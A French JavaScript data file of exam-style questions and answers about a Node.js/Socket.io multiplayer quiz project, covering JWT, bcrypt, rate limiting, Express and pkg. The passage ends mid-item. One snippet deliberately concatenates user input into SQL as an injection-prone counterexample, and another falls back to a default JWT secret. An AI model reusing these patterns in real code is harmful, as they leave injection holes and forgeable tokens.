export const DATA_P2 = [
  {id:"p2_1",proj:"p2",num:1,category:`WebSocket & Socket.io`,thematique:"",question:`Qu'est-ce qu'un WebSocket ? Pourquoi l'avez-vous choisi plutôt que HTTP ?`,answer:`<p>HTTP est unidirectionnel : le client demande, le serveur répond, la connexion se ferme. Pour un quiz en temps réel, il faudrait que le client interroge le serveur toutes les 100ms (polling) — très inefficace.</p>
<p>WebSocket établit une connexion persistante bidirectionnelle. Le serveur peut envoyer une question à tous les joueurs simultanément sans attendre qu'ils la demandent. Socket.io est une bibliothèque qui facilite l'utilisation des WebSockets.</p>
<pre>// Serveur envoie à TOUS les joueurs en même temps
io.to(codePartie).emit('question', { question: safeQ(question), startedAt: Date.now() });

// Client reçoit instantanément
socket.on('question', ({ question, startedAt }) =&gt; { afficherQuestion(question); });</pre>`,freq:"hot",},
  {id:"p2_2",proj:"p2",num:2,category:`WebSocket & Socket.io`,thematique:"",question:`Comment fonctionnent les rooms (salles) dans Socket.io ?`,answer:`<p>Une room est un canal de diffusion nommé. Un client peut rejoindre une room, et le serveur peut envoyer un message à tous les membres de cette room uniquement.</p>
<pre>// Rejoindre une salle
socket.join(codePartie);

// Envoyer à TOUS les membres de la salle
io.to(codePartie).emit('player_joined', { name: joueur.name });

// Envoyer à TOUS sauf l'émetteur
socket.to(codePartie).emit('player_joined', { name: joueur.name });

// Envoyer à un seul socket (un seul joueur)
io.to(socket.id).emit('join_error', { message: 'Code invalide' });</pre>
<p>Dans votre application, chaque partie est une room identifiée par son code à 4 chiffres. Les questions, réponses et scores ne sont diffusés qu'aux joueurs de cette salle.</p>`,freq:"hot",},
  {id:"p2_3",proj:"p2",num:3,category:`WebSocket & Socket.io`,thematique:"",question:`Qu'est-ce qu'une race condition ? Comment l'avez-vous résolue sur RJ45 ?`,answer:`<p>Une race condition (condition de course) se produit quand deux événements arrivent dans un ordre imprévu et créent un état incohérent.</p>
<p>Sur câble RJ45, la latence est variable : une réponse envoyée 50ms avant le timeout peut arriver 50ms après que le serveur ait déjà déclenché le timeout. Résultat : <code>answer_result</code> émis deux fois, UI incohérente.</p>
<pre>// FIX : 3 phases séparées dans le timeout serveur
// Phase 1 : marquer answered AVANT d'émettre quoi que ce soit
pending.forEach(name =&gt; {
    room.answered.add(name);    // ← le guard bloque toute réponse tardive
    room.scores[name].points -= penalty;
});
// Phase 2 : émettre les résultats avec scores définitifs
pending.forEach(name =&gt; io.to(code).emit('answer_result', { ... }));
// Phase 3 : résoudre le round une seule fois
if (room.answered.size &gt;= room.players.length) resolveRound(code, room);</pre>
<p>La clé : <code>room.answered.add(name)</code> en Phase 1 fait que si une réponse tardive arrive, le guard <code>if (room.answered.has(name)) return;</code> la bloque immédiatement.</p>`,freq:"hot",},
  {id:"p2_4",proj:"p2",num:4,category:`WebSocket & Socket.io`,thematique:"",question:`Comment le timer serveur est-il synchronisé avec les clients ?`,answer:`<p>Le serveur envoie l'heure de départ (<code>startedAt = Date.now()</code>) avec chaque question. Le client calcule le temps déjà écoulé depuis ce timestamp et démarre son timer à partir du temps restant.</p>
<pre>// Serveur
io.to(code).emit('question', { question: safeQ(q), startedAt: Date.now() });

// Client — timer.startAt() recale sur l'horloge serveur
socket.on('question', ({ question, startedAt }) =&gt; {
    timer.startAt(startedAt);  // Temps déjà écoulé = Date.now() - startedAt
    renderQuestion(question);
});</pre>
<p>Même si le message réseau met 200ms, tous les joueurs voient exactement le même temps restant. Le serveur impose également son propre timeout (+500ms de grâce réseau).</p>`,freq:"hot",},
  {id:"p2_5",proj:"p2",num:5,category:`Sécurité Node.js`,thematique:"",question:`Qu'est-ce qu'un JWT et comment l'utilisez-vous ?`,answer:`<p>JWT (JSON Web Token) est un token signé qui prouve l'identité d'un utilisateur sans stocker de session côté serveur. Il contient des données (id, rôle) et une signature vérifiable.</p>
<pre>// Création à la connexion
const token = jwt.sign(
    { id: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '8h' }
);

// Vérification sur chaque route protégée
function requireAuth(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    const payload = jwt.verify(token, process.env.JWT_SECRET);
    req.user = payload;
    next();
}</pre>
<p>L'administrateur reçoit le token à la connexion et l'envoie dans chaque requête (<code>Authorization: Bearer &lt;token&gt;</code>). Valide 8h — expire automatiquement.</p>`,freq:"hot",},
  {id:"p2_6",proj:"p2",num:6,category:`Sécurité Node.js`,thematique:"",question:`Pourquoi hasher les mots de passe avec bcrypt ? Que sont les "rounds" ?`,answer:`<p>Si la base de données est volée, les mots de passe ne doivent pas être lisibles. bcrypt transforme le mot de passe en une valeur irréversible. Même avec le hash, on ne peut pas retrouver le mot de passe d'origine.</p>
<pre>// Enregistrement : hash avant stockage
const hash = await bcrypt.hash(motDePasse, 12);  // 12 rounds

// Vérification à la connexion
const ok = await bcrypt.compare(motDePasseSaisi, hashEnBase);</pre>
<p>Les "rounds" (12 dans votre cas) définissent le nombre d'itérations de l'algorithme. Plus il y en a, plus le calcul est lent — ce qui décourage les attaques par force brute (chercher parmi des millions de mots de passe).</p>`,freq:"hot",},
  {id:"p2_7",proj:"p2",num:7,category:`Sécurité Node.js`,thematique:"",question:`Qu'est-ce que le rate limiting et pourquoi l'avez-vous appliqué à deux niveaux ?`,answer:`<p>Le rate limiting limite le nombre de requêtes qu'une IP peut envoyer sur une période donnée. Il protège contre les attaques par force brute et le flood.</p>
<pre>// Niveau 1 : route de login (très strict)
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 10,                    // 10 tentatives max
    skipSuccessfulRequests: true // Ne compte que les échecs
});

// Niveau 2 : événements Socket.io (anti-flood en partie)
let eventCount = 0;
socket.on('answer', (data) =&gt; {
    eventCount++;
    if (eventCount &gt; 60) { socket.disconnect(); return; } // 60 events/30s
    // ... traitement
});</pre>
<p>Le premier protège les admins contre le brute force. Le second empêche un joueur malveillant d'inonder le serveur d'événements pour le saturer.</p>`,freq:"med",},
  {id:"p2_8",proj:"p2",num:8,category:`Sécurité Node.js`,thematique:"",question:`Pourquoi la fonction <code>safeQ()</code> est-elle critique pour la sécurité ?`,answer:`<p>La bonne réponse (<code>_answer</code>) est stockée dans l'objet question côté serveur. Si elle était envoyée au client, n'importe quel joueur pourrait la lire dans les outils de développement du navigateur et tricher.</p>
<pre>function safeQ(questionAvecReponse) {
    // Destructuring : retire _answer, garde tout le reste
    const { _answer, ...questionSansPousse } = questionAvecReponse;
    return questionSansPousse;  // Envoyé au client — jamais de _answer
}

// Utilisation obligatoire avant tout emit
io.to(code).emit('question', { question: safeQ(q), startedAt: Date.now() });</pre>`,freq:"hot",},
  {id:"p2_9",proj:"p2",num:9,category:`Base de données & API`,thematique:"",question:`Pourquoi des requêtes préparées plutôt que du SQL dynamique ?`,answer:`<p>Une requête dynamique construit le SQL en concaténant des chaînes — dangereuse si les valeurs viennent de l'utilisateur (injection SQL). Une requête préparée sépare le SQL des données.</p>
<pre>// ❌ DANGEREUX — injection SQL possible
db.exec(\`SELECT * FROM questions WHERE category = '\${req.body.cat}'\`);

// ✅ SÛRE — requête préparée au démarrage
const stmt = db.prepare('SELECT * FROM questions WHERE category = ?');
// Lors de chaque appel :
const questions = stmt.all(req.body.cat);  // Valeur toujours traitée comme texte</pre>
<p>Dans votre projet, TOUTES les requêtes sont préparées dans <code>src/db/statements.js</code> au démarrage. Elles sont compilées une fois et réutilisées — plus rapide et 100% protégées.</p>`,freq:"hot",},
  {id:"p2_10",proj:"p2",num:10,category:`Base de données & API`,thematique:"",question:`Qu'est-ce qu'une API REST ? Comment avez-vous structuré la vôtre ?`,answer:`<p>Une API REST utilise les verbes HTTP pour définir les actions : GET (lire), POST (créer), PUT (modifier), DELETE (supprimer). L'URL identifie la ressource, le verbe l'action.</p>
<pre>GET    /api/v1/quiz?difficulty=normal  → Liste questions filtrées
POST   /api/v1/quiz                   → Créer une question (auth requise)
PUT    /api/v1/quiz/:id               → Modifier une question (auth)
DELETE /api/v1/quiz/:id               → Supprimer (auth)
POST   /api/v1/auth/login             → Connexion admin → JWT
GET    /api/v1/admin/settings         → Lire les paramètres (auth)
PUT    /api/v1/admin/settings         → Modifier les paramètres (auth)</pre>
<p>6 routeurs Express organisés sous <code>/api/v1/</code> pour le versionnage.</p>`,freq:"easy",},
  {id:"p2_11",proj:"p2",num:11,category:`Architecture front-end`,thematique:"",question:`Pourquoi avez-vous refactorisé le code en 7 modules ES ?`,answer:`<p>Le fichier initial faisait 1449 lignes. Un fichier unique :</p>
<ul style="padding-left:1rem;margin:8px 0;line-height:1.8">
<li>Est difficile à lire : on ne sait plus "où est quoi"</li>
<li>Génère des conflits Git quand plusieurs personnes travaillent dessus</li>
<li>Impossible à tester unitairement</li>
</ul>
<p>Avec 7 modules (<code>mp-state.js</code>, <code>mp-game.js</code>, <code>mp-lobby.js</code>…) :<br/>
        — Chaque module a une responsabilité unique (SRP)<br/>
        — On peut modifier <code>mp-grid.js</code> sans toucher à <code>mp-game.js</code><br/>
        — Les tests Jest peuvent importer et tester chaque fonction indépendamment</p>`,freq:"hot",},
  {id:"p2_12",proj:"p2",num:12,category:`Architecture front-end`,thematique:"",question:`Qu'est-ce que la délégation d'événements ? Comment a-t-elle corrigé le bug apostrophe ?`,answer:`<p>La délégation d'événements : au lieu de mettre un listener sur chaque bouton, on en met un seul sur le parent. Le listener vérifie quel élément a déclenché l'événement.</p>
<pre>// ❌ AVANT (inline) — bug sur L'île, L'ours, D'accord...
btn.innerHTML = \`&lt;button onclick="handleAnswer('\${answer}')"&gt;L'île&lt;/button&gt;\`;
// → SyntaxError : handleAnswer('L'île') — l'apostrophe ferme la chaîne !

// ✅ APRÈS (délégation) — fix v5.0.1
btn.dataset.answer = answer;  // Stocké dans un attribut data, pas dans JS
document.addEventListener('click', e =&gt; {
    const btn = e.target.closest('.ab[data-answer]');
    if (btn) window.handleAnswer(btn.dataset.answer);  // Lu depuis l'attribut
});</pre>
<p>La valeur est stockée dans <code>data-answer</code> et lue via <code>.dataset.answer</code> — jamais interpolée dans du code JavaScript.</p>`,freq:"hot",},
  {id:"p2_13",proj:"p2",num:13,category:`pkg & Déploiement`,thematique:"",question:`Expliquez-moi pkg — qu'est-ce que c'est et pourquoi l'avez-vous utilisé ?`,answer:`<p><b>Le problème de départ</b> : pour lancer le quiz normalement, un animateur non-développeur devrait installer Node.js, télécharger le code, faire <code>npm install</code> puis <code>npm start</code>. C'est beaucoup trop compliqué.</p>
<p><b>Ce que fait pkg</b> : c'est un outil créé par Vercel (la société derrière Next.js) qui conditionne toute l'application dans un seul fichier exécutable autonome. Ce fichier contient à l'intérieur :</p>
<ul style="padding-left:1rem;margin:8px 0;line-height:1.8">
<li>Le moteur Node.js lui-même</li>
<li>Tout le code du serveur (<code>server.js</code>, <code>src/</code>…)</li>
<li>Tous les fichiers HTML, CSS et JS du dossier <code>public/</code></li>
</ul>
<pre>// package.json — les 3 commandes de compilation
"scripts": {
    "build:win":   "pkg . --target node18-win-x64    --output dist/QuizzFinal-win.exe",
    "build:mac":   "pkg . --target node18-macos-arm64 --output dist/QuizzFinal-mac",
    "build:linux": "pkg . --target node18-linux-x64   --output dist/QuizzFinal-linux"
}</pre>
<p>Résultat : l'animateur reçoit un fichier <code>QuizzFinal-win.exe</code>, il double-clique dessus, le navigateur s'ouvre sur <code>http://localhost:3001</code>. Aucune installation de quoi que ce soit.</p>
<p><b>La subtilité de la base de données</b> : la base SQLite ne peut pas être enfermée à l'intérieur du binaire car elle doit être modifiable (on y écrit des scores). Au premier lancement, pkg crée automatiquement le fichier <code>quizz.db</code> <em>à côté</em> de l'exécutable, sur le vrai disque dur. Les données persistent entre les redémarrages.</p>
<p><b>Pourquoi "Vercel" dans le nom ?</b> pkg a été développé par Vercel et mis à disposition gratuitement. Ce n'est pas leur produit principal — Vercel est surtout connu pour héberger des sites web — mais ils ont créé cet outil pour la communauté Node.js. Quand on dit "pkg (Vercel)" c'est comme dire "Jest (Meta)" ou "TypeScript (Microsoft)" : ça précise juste qui l'a fait.</p>`,freq:"hot",},
  {id:"p2_14",proj:"p2",num:14,category:`pkg & Déploiement`,thematique:"",question:`Pourquoi better-sqlite3 pose-t-il un problème sous pkg et comment l'avez-vous résolu ?`,answer:`<p>better-sqlite3 contient un module natif (<code>.node</code>) — un binaire compilé en C++. pkg embarque les fichiers JS dans un "snapshot" virtuel, mais les binaires C++ ne peuvent pas s'exécuter depuis ce snapshot : ils doivent être sur le vrai système de fichiers.</p>
<pre>if (IS_PKG) {
    // 1. Définir le dossier de destination dans /tmp/
    const dstNode = path.join(os.tmpdir(), 'quizz-native', 'better_sqlite3.node');

    // 2. Copier le binaire depuis le snapshot vers /tmp/ au 1er lancement
    fs.copyFileSync(srcNode, dstNode);

    // 3. Monkey-patch Node.js pour rediriger le chargement
    Module._resolveFilename = (req, ...args) =&gt;
        req.endsWith('.node') ? dstNode : _original(req, ...args);
}</pre>
<p>Au premier lancement, le binaire est extrait vers <code>/tmp/quizz-native/</code>. Les lancements suivants le réutilisent. Si l'exe est mis à jour (taille différente), le binaire est re-copié.</p>`,freq:"med",},
  {id:"p2_15",proj:"p2",num:15,category:`Tests Jest`,thematique:"",question:`Qu'est-ce que Jest et comment avez-vous atteint 100% de couverture ?`,answer:`<p>Jest est un framework de tests JavaScript. Il exécute vos tests, vérifie les résultats avec <code>expect()</code> et génère un rapport de couverture (quelles lignes sont exécutées par les tests).</p>
<pre>// tests/game.test.js
describe('calcScore()', () =&gt; {
    test('bonne réponse instantanée = 2000 pts', () =&gt; {
        const pts = calcScore({ correct:true, isTimeout:false, timeUsed:0,
            timerMs:45000, speedBonusOn:true, penalty:200, pointsActuels:0 });
        expect(pts).toBe(2000);
    });
    test('mauvaise réponse → pas de changement', () =&gt; {
        const pts = calcScore({ correct:false, isTimeout:false, pointsActuels:500 });
        expect(pts).toBe(500);
    });
});</pre>
<p>100% de couverture = chaque ligne et chaque branche (if/else) de la fonction est exécutée par au moins un test. On atteint ça en couvrant : le cas nominal, les cas limites (0, max), et les cas d'erreur (timeout, valeur manquante).</p>`,freq:"med",},
  {id:"p2_16",proj:"p2",num:16,category:`Tests Jest`,thematique:"",question:`Qu'est-ce que Supertest et à quoi sert-il dans vos tests de routes ?`,answer:`<p>Supertest simule des requêtes HTTP vers votre serveur Express sans démarrer un vrai serveur réseau. Il permet de tester les routes API comme si on envoyait de vraies requêtes.</p>
<pre>const request = require('supertest');
const app = require('../server');

test('GET /api/v1/quiz retourne les questions', async () =&gt; {
    const res = await request(app).get('/api/v1/quiz');
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body)).toBe(true);
});

test('POST /api/v1/quiz sans auth → 401', async () =&gt; {
    const res = await request(app).post('/api/v1/quiz').send({ question: 'Test' });
    expect(res.status).toBe(401);
});</pre>`,freq:"med",},
  {id:"p2_17",proj:"p2",num:17,category:`Questions générales`,thematique:"",question:`Quelle est la différence entre HTTP et HTTPS ?`,answer:`<p>HTTP transmet les données en clair — n'importe qui sur le réseau peut les lire (attaque man-in-the-middle). HTTPS chiffre les données via TLS/SSL — même interceptées, elles sont illisibles sans la clé privée.</p>
<p>Pour votre application multijoueur en réseau local, HTTPS n'est pas obligatoire (réseau interne). En déploiement public, il serait activé via Nginx + Certbot (Let's Encrypt) — certificat gratuit.</p>`,freq:"easy",},
  {id:"p2_18",proj:"p2",num:18,category:`Questions générales`,thematique:"",question:`Qu'est-ce que Helmet.js et quels headers de sécurité active-t-il ?`,answer:`<p>Helmet.js est un middleware Express qui ajoute automatiquement des headers HTTP de sécurité à chaque réponse.</p>
<pre>app.use(helmet());</pre>
<p>Headers activés :<br/>
        — <code>X-Content-Type-Options: nosniff</code> → empêche le navigateur de "deviner" le type MIME<br/>
        — <code>X-Frame-Options: SAMEORIGIN</code> → empêche l'intégration dans une iframe externe (anti-clickjacking)<br/>
        — <code>Referrer-Policy: no-referrer</code> → ne transmet pas l'URL de provenance aux sites tiers<br/>
        — <code>X-XSS-Protection</code> → active la protection XSS du navigateur</p>`,freq:"med",},
  {id:"p2_19",proj:"p2",num:19,category:`Questions générales`,thematique:"",question:`Qu'est-ce que le CORS et pourquoi est-ce acceptable d'avoir <code>*</code> en réseau local ?`,answer:`<p>CORS (Cross-Origin Resource Sharing) est une politique de sécurité des navigateurs : par défaut, une page web ne peut faire des requêtes qu'au même serveur. Pour autoriser d'autres origines, le serveur doit le déclarer.</p>
<p>En réseau local, les joueurs accèdent au serveur via son IP (<code>http://192.168.1.x:3001</code>) depuis différents navigateurs. Le <code>*</code> (toutes origines) est acceptable ici car :<br/>
        — Réseau local fermé, sans accès internet<br/>
        — Pas de données sensibles exposées aux joueurs<br/>
        — En déploiement public, on remplacerait <code>*</code> par l'URL exacte du domaine</p>`,freq:"easy",},
  {id:"p2_20",proj:"p2",num:20,category:`Questions générales`,thematique:"",question:`Comment avez-vous géré la persistance des données avec pkg ?`,answer:`<p>Le snapshot pkg est en lecture seule : on ne peut pas écrire dans la base de données SQLite si elle est embarquée dans le binaire. La base doit être sur le vrai système de fichiers, à côté de l'exécutable.</p>
<pre>function dataPath(filename) {
    if (IS_PKG) {
        // process.execPath = chemin de l'exe
        // Le .db est dans le même dossier que QuizzFinal-win.exe
        return path.join(path.dirname(process.execPath), filename);
    }
    // En mode développement normal
    return path.join(__dirname, '..', '..', 'data', filename);
}</pre>
<p>Résultat : <code>data/quizz.db</code> est créé à côté de l'exe au premier lancement et persiste entre les redémarrages. Les questions et scores sont conservés.</p>`,freq:"med",},
  {id:"p2_21",proj:"p2",num:21,category:`Questions générales`,thematique:"",question:`Qu'est-ce qu'un middleware Express ?`,answer:`<p>Un middleware est une fonction qui s'exécute entre la réception de la requête et l'envoi de la réponse. Il peut modifier la requête, la réponse, ou interrompre le traitement.</p>
<pre>// Middleware d'authentification
function requireAuth(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Non autorisé' });
    try {
        req.user = jwt.verify(token, process.env.JWT_SECRET);
        next();  // ← Passer au prochain middleware ou à la route
    } catch {
        return res.status(401).json({ error: 'Token invalide' });
    }
}

// Utilisation sur une route
app.put('/api/v1/admin/settings', requireAuth, updateSettings);</pre>`,freq:"easy",},
  {id:"p2_22",proj:"p2",num:22,category:`Questions générales`,thematique:"",question:`Qu'est-ce qu'un service systemd et pourquoi l'utilisez-vous ?`,answer:`<p>systemd est le gestionnaire de services d'Ubuntu. Un service systemd démarre automatiquement au boot, redémarre en cas de crash, et peut être contrôlé facilement.</p>
<pre>sudo systemctl enable --now quizz    # Démarrer + activer au boot
sudo systemctl restart quizz         # Redémarrer (après déploiement)
sudo systemctl stop quizz            # Arrêter
sudo journalctl -u quizz -f          # Voir les logs en temps réel</pre>
<p>Sans systemd, si le serveur redémarre ou si Node.js plante, l'application reste arrêtée. Avec systemd, elle repart automatiquement sans intervention manuelle.</p>`,freq:"easy",},
  {id:"p2_23",proj:"p2",num:23,category:`Questions générales`,thematique:"",question:`Comment fonctionnent les variables d'environnement et pourquoi ne pas hardcoder les secrets ?`,answer:`<p>Les variables d'environnement sont des valeurs externes injectées au lancement de l'application, lues via <code>process.env.NOM_VARIABLE</code>. Elles permettent de configurer l'application différemment selon l'environnement (dev/prod) sans modifier le code.</p>
<pre># .env (non versionné dans Git)
JWT_SECRET=mon_secret_tres_long_et_aleatoire_32chars
PORT=3001
NODE_ENV=production

// Code Node.js
const secret = process.env.JWT_SECRET;
if (!secret) console.warn('[WARN] JWT_SECRET absent — utilisation du secret par défaut !');</pre>
<p>Si <code>JWT_SECRET</code> est écrit directement dans le code et commitée dans Git, n'importe qui avec accès au dépôt peut forger des tokens admin.</p>`,freq:"easy",},
  {id:"p2_24",proj:"p2",num:24,category:`Questions générales`,thematique:"",question:`Qu'est-ce que la compression gzip et pourquoi l'avez-vous activée ?`,answer:`<p>La compression gzip réduit la taille des réponses HTTP (fichiers CSS, JS, JSON) avant de les envoyer au client. Le navigateur les décompresse automatiquement.</p>
<pre>const compression = require('compression');
app.use(compression());  // Active gzip sur toutes les réponses</pre>
<p>Un fichier CSS de 50 Ko peut être réduit à 10 Ko en gzip. Sur un réseau Wi-Fi local, cela accélère le chargement initial, notamment pour les participants qui se connectent simultanément au début d'une session.</p>`,freq:"easy",},
  {id:"p2_25",proj:"p2",num:25,category:`Node.js — Fondamentaux`,thematique:"",question:`Qu'est-ce que Node.js et en quoi est-il différent du JavaScript navigateur ?`,answer:`<p>Node.js est un environnement d'exécution JavaScript côté serveur, basé sur le moteur V8 de Chrome. Il permet de faire tourner du JavaScript en dehors du navigateur : sur un serveur, un terminal ou un ordinateur.</p>
<p>Différences clés :</p>
<ul style="padding-left:1rem;margin:8px 0;line-height:1.8">
<li><b>Navigateur</b> : accès au DOM (<code>document</code>, <code>window</code>), pas d'accès aux fichiers</li>
<li><b>Node.js</b> : accès aux fichiers (<code>fs</code>), réseau (<code>http</code>), processus — mais pas de DOM</li>
</ul>
<pre>// Côté Node.js — lire un fichier (impossible dans un navigateur)
const fs = require('fs');
const contenu = fs.readFileSync('data/quizz.db');

// Côté navigateur — accéder au DOM (impossible dans Node.js)
document.getElementById('score').textContent = '1000';</pre>
<p>Dans votre projet, Node.js fait tourner le serveur Express, gère la base SQLite et les WebSockets. Le navigateur des joueurs exécute uniquement les fichiers JS de <code>public/js/</code>.</p>`,freq:"hot",},
  {id:"p2_26",proj:"p2",num:26,category:`Node.js — Fondamentaux`,thematique:"",question:`Qu'est-ce que la boucle d'événements (event loop) de Node.js ?`,answer:`<p>Node.js est mono-thread : il n'exécute qu'une seule chose à la fois. La boucle d'événements lui permet quand même de gérer plusieurs requêtes simultanément en ne bloquant jamais sur les opérations lentes (réseau, fichiers) — il délègue ces opérations et reprend la main dès que le résultat est prêt.</p>
<pre>// ❌ Bloquant : Node.js ne peut rien faire d'autre pendant ce calcul
const result = fs.readFileSync('gros-fichier.txt'); // Attend ici

// ✅ Non-bloquant : Node.js continue à traiter d'autres requêtes
fs.readFile('gros-fichier.txt', (err, data) =&gt; {
    // Exécuté quand le fichier est prêt, 200ms plus tard
    console.log(data);
});
// Node.js exécute d'autres choses ici pendant la lecture</pre>
<p>C'est pour ça que Node.js est très efficace pour les serveurs : il peut gérer des centaines de connexions Socket.io en même temps avec un seul thread, tant que le code n'est pas bloquant.</p>
<p><b>Dans votre projet</b> : <code>better-sqlite3</code> est synchrone (bloquant), ce qui est acceptable car les requêtes SQLite sont très rapides (&lt;1ms). Les opérations réseau Socket.io, elles, sont toutes asynchrones.</p>`,freq:"hot",},
  {id:"p2_27",proj:"p2",num:27,category:`Node.js — Fondamentaux`,thematique:"",question:`Qu'est-ce que npm et à quoi sert le fichier <code>package.json</code> ?`,answer:`<p>npm (Node Package Manager) est le gestionnaire de paquets de Node.js. Il permet d'installer des bibliothèques tierces (Express, Socket.io, etc.) et de définir des scripts de lancement.</p>
<p><code>package.json</code> est le fichier de configuration du projet : il liste les dépendances, la version du projet et les scripts disponibles.</p>
<pre>{
  "name": "quizz-multijoueur",
  "version": "6.0.0",
  "scripts": {
    "start":      "node server.js",        // npm start → lance le serveur
    "test":       "jest",                  // npm test  → lance les tests
    "build:win":  "pkg . --target node18-win-x64 --output dist/QuizzFinal-win.exe"
  },
  "dependencies": {
    "express":       "^4.18.0",   // Dépendances de production
    "socket.io":     "^4.7.0",
    "better-sqlite3":"^9.4.0"
  },
  "devDependencies": {
    "jest":      "^30.0.0",  // Dépendances uniquement pour le développement
    "supertest": "^7.0.0"
  }
}</pre>
<p>Le dossier <code>node_modules/</code> contient les fichiers installés — il n'est jamais versionné dans Git (trop lourd). On le recrée avec <code>npm install</code> à partir du <code>package.json</code>.</p>`,freq:"easy",},
  {id:"p2_28",proj:"p2",num:28,category:`Node.js — Fondamentaux`,thematique:"",question:`Qu'est-ce que <code>async/await</code> et pourquoi l'utilisez-vous ?`,answer:`<p><code>async/await</code> est une syntaxe pour écrire du code asynchrone (non-bloquant) de façon lisible, sans imbrication de callbacks.</p>
<pre>// ❌ Ancienne syntaxe avec callbacks — "callback hell"
bcrypt.hash(password, 12, function(err, hash) {
    db.run('INSERT INTO users ...', [hash], function(err) {
        res.json({ ok: true });  // Difficile à lire et à maintenir
    });
});

// ✅ Avec async/await — se lit comme du code synchrone
async function createUser(password) {
    const hash = await bcrypt.hash(password, 12);  // Attend le résultat
    await db.run('INSERT INTO users ...', [hash]);   // Puis fait ça
    res.json({ ok: true });
}</pre>
<p>Dans votre projet, <code>bcrypt.hash()</code> et <code>bcrypt.compare()</code> sont asynchrones (le calcul prend ~100ms). Le mot-clé <code>await</code> suspend la fonction le temps du calcul sans bloquer le reste du serveur.</p>`,freq:"hot",},
  {id:"p2_29",proj:"p2",num:29,category:`Express.js — Approfondissement`,thematique:"",question:`Comment fonctionne le routage dans Express et qu'est-ce qu'un <code>Router</code> ?`,answer:`<p>Dans Express, une route associe une URL + un verbe HTTP à une fonction handler. Un <code>Router</code> est un mini-Express qui regroupe des routes liées pour les organiser dans des fichiers séparés.</p>
<pre>// src/routes/quiz.js — routeur dédié aux questions
const router = express.Router();

router.get('/',    getQuestions);    // GET  /api/v1/quiz
router.post('/',   requireAuth, createQuestion); // POST /api/v1/quiz
router.put('/:id', requireAuth, updateQuestion); // PUT  /api/v1/quiz/42
router.delete('/:id', requireAuth, deleteQuestion);

module.exports = router;

// server.js — montage du routeur
app.use('/api/v1/quiz', require('./src/routes/quiz'));</pre>
<p>Chaque technologie a son fichier : <code>auth.js</code>, <code>quiz.js</code>, <code>categories.js</code>, <code>games.js</code>, <code>admin.js</code>, <code>daily.js</code>. Cela évite un seul fichier <code>server.js</code> de 2000 lignes.</p>`,freq:"hot",},
  {id:"p2_30",proj:"p2",num:30,category:`Express.js — Approfondissement`,thematique:"",question:`Qu'est-ce que <code>req</code>, <code>res</code> et <code>next</code> dans Express ?`,answer:`<p>Ce sont les trois paramètres que reçoit chaque middleware ou handler de route dans Express :</p>
<ul style="padding-left:1rem;margin:8px 0;line-height:1.8">
<li><b><code>req</code></b> (request) : tout ce qui vient du client — URL, paramètres, body, headers, cookies</li>
<li><b><code>res</code></b> (response) : les méthodes pour répondre au client — <code>res.json()</code>, <code>res.status()</code>, <code>res.send()</code></li>
<li><b><code>next</code></b> : une fonction qui passe au middleware suivant dans la chaîne</li>
</ul>
<pre>// Exemple concret de votre projet
async function getQuestions(req, res) {
    const difficulty = req.query.difficulty;  // ?difficulty=normal dans l'URL
    const category   = req.params.id;         // /quiz/5 → id = "5"
    const body       = req.body;              // Données du POST (JSON)

    const questions = stmts.getByDifficulty.all(difficulty);
    res.json(questions);  // Répond avec le tableau JSON
}</pre>`,freq:"easy",},
  {id:"p2_31",proj:"p2",num:31,category:`Express.js — Approfondissement`,thematique:"",question:`Comment gérez-vous les erreurs dans Express ?`,answer:`<p>Dans Express, un middleware de gestion d'erreurs prend 4 paramètres : <code>(err, req, res, next)</code>. Il intercepte toutes les erreurs non gérées et retourne une réponse propre au lieu de planter le serveur.</p>
<pre>// Dans une route — on passe l'erreur à next()
app.get('/api/v1/quiz/:id', async (req, res, next) =&gt; {
    try {
        const q = stmts.getById.get(req.params.id);
        if (!q) return res.status(404).json({ error: 'Question introuvable' });
        res.json(q);
    } catch (err) {
        next(err);  // Transmis au middleware d'erreur ci-dessous
    }
});

// Middleware d'erreur global — doit être le dernier app.use()
app.use((err, req, res, next) =&gt; {
    console.error('[ERROR]', err.message);
    const status = err.status || 500;
    res.status(status).json({ error: err.message || 'Erreur serveur' });
});</pre>
<p>Cela évite que le serveur affiche une stacktrace complète (qui peut révéler des informations sensibles) et retourne toujours un JSON cohérent même en cas d'erreur inattendue.</p>`,freq:"med",},
  {id:"p2_32",proj:"p2",num:32,category:`JWT & Authentification — Approfondissement`,thematique:"",question:`Quelle est la structure d'un JWT ? Que contiennent les 3 parties ?`,answer:`<p>Un JWT est une chaîne de texte en 3 parties séparées par des points : <code>header.payload.signature</code>. Chaque partie est encodée en Base64url (pas chiffrée — lisible par n'importe qui).</p>
<pre>// Exemple de token JWT (raccourci)
eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwiZXhwIjoxNzAwMDAwfQ.abc123

// ── Partie 1 : Header ──────────────────────────
// Algorithme de signature utilisé
{ "alg": "HS256", "typ": "JWT" }

// ── Partie 2 : Payload (données) ───────────────
// Ce que vous stockez — lisible sans clé secrète !
{ "id": 1, "role": "admin", "exp": 1700000000 }

// ── Partie 3 : Signature ────────────────────────
// HMAC-SHA256(base64(header) + "." + base64(payload), JWT_SECRET)
// Seul le serveur peut la recalculer → prouve l'authenticité</pre>
<p><b>Point important</b> : le payload est lisible par tout le monde (il est juste encodé, pas chiffré). Ne jamais y mettre un mot de passe ou une donnée confidentielle. La signature garantit que personne n'a modifié le token.</p>`,freq:"hot",},
  {id:"p2_33",proj:"p2",num:33,category:`JWT & Authentification — Approfondissement`,thematique:"",question:`Comment un attaquant pourrait-il abuser d'un JWT ? Quelles protections avez-vous mises en place ?`,answer:`<p>Deux risques principaux :</p>
<p><b>1. Vol du token</b> (XSS) : si un script malveillant s'exécute sur la page, il peut lire le token et l'envoyer à un attaquant.</p>
<p><b>2. Durée de vie trop longue</b> : si un token valable 30 jours est volé, l'attaquant a 30 jours d'accès.</p>
<pre>// Protection 1 : Expiration courte (8h)
const token = jwt.sign({ id: user.id }, process.env.JWT_SECRET, { expiresIn: '8h' });

// Protection 2 : XSS — la fonction esc() échappe tout HTML avant injection dans le DOM
function esc(str) {
    return String(str)
        .replace(/&amp;/g, '&amp;amp;')
        .replace(/&lt;/g, '&amp;lt;')
        .replace(/&gt;/g, '&amp;gt;')
        .replace(/"/g, '&amp;quot;');
}

